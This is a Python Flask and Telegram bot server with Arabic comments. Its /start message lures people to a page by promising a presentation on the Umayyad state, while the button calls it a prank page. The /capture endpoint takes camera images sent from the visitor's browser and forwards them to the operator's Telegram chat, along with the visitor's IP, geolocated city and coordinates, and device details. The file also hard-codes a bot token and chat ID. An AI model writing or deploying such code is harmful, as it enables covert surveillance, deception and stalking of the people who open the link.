import os
import base64
import requests
from flask import Flask, request, jsonify, send_from_directory
from telebot import TeleBot, types
from datetime import datetime

app = Flask(__name__)

# التوكن الجديد (تم التحديث)
TOKEN = "8877750705:AAGDWY4Jk468XfNemHhdz_MZYb6jvF9nBzE"
CHAT_ID = 821436485  # تأكد من صحة هذا الرقم

bot = TeleBot(TOKEN)

# ------------------- دالة الموقع -------------------
def get_location_from_ip(ip):
    try:
        if ip.startswith('127.') or ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
            return "محمي (شبكة خاصة)"
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,city,regionName,lat,lon', timeout=5)
        data = response.json()
        if data.get('status') == 'success':
            city = data.get('city', 'غير معروف')
            region = data.get('regionName', 'غير معروف')
            country = data.get('country', 'غير معروف')
            lat = data.get('lat', '')
            lon = data.get('lon', '')
            if lat and lon:
                return f"{city}, {region}, {country} (📍 {lat}, {lon})"
            return f"{city}, {region}, {country}"
        return "غير متاح"
    except Exception as e:
        return "غير متاح"

# ------------------- أمر /start -------------------
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot_url = "https://bnyumyaa.onrender.com"   # الرابط الفعلي لخدمتك
    keyboard = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="🚀 افتح صفحة المقلب", url=bot_url)
    keyboard.add(button)
    bot.send_message(
        message.chat.id,
        f"مرحباً بك! 🕌\n\nلبدء العرض التقديمي الحي للدولة الأموية، اضغط على الزر أدناه:\n\n{bot_url}",
        reply_markup=keyboard
    )

# ------------------- صفحات الويب -------------------
@app.route('/')
def index():
    return send_from_directory('templates', 'index.html')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json()
        if not data or 'image' not in data:
            return jsonify({"status": "error"}), 400
        img_data = base64.b64decode(data['image'].split(',')[1])
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if client_ip and ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()
        location = get_location_from_ip(client_ip)
        device = data.get('device_info', {})
        camera_type = data.get('camera', 'unknown')
        msg = f"<b>📸 صورة ({camera_type})</b>\n"
        msg += f"🌐 IP: <code>{client_ip}</code>\n"
        msg += f"📍 الموقع: {location}\n"
        msg += f"💻 الجهاز: {device.get('os', '?')} | {device.get('browser', '?')}\n"
        msg += f"📱 الشاشة: {device.get('screen', '?')}\n"
        msg += f"🗣️ اللغة: {device.get('language', '?')}\n"
        msg += f"🕒 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        bot.send_photo(CHAT_ID, img_data, caption=msg, parse_mode='HTML')
        return jsonify({"status": "sent"})
    except Exception as e:
        print("خطأ في /capture:", e)
        return jsonify({"status": "error"}), 500

# ------------------- ويب هوك لتلقي أوامر تليغرام -------------------
@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_str = request.get_data().decode('UTF-8')
        update = types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return '', 200
    else:
        return '', 403

# ------------------- تشغيل الخادم -------------------
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
